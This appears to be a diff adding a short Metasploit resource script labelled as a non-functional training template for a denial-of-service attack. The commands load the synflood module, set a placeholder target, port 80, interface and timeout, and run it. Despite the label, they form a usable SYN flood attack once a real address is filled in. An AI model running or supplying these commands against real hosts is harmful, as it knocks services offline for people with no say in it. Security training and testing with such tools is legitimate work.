@@ -1,0 +1,9 @@
+# DoS Attack Template
+# For Training Use – Non-functional Template
+
+use auxiliary/dos/tcp/synflood
+set RHOST <TARGET_IP>
+set RPORT 80
+set INTERFACE eth0
+set TIMEOUT 5000
+run
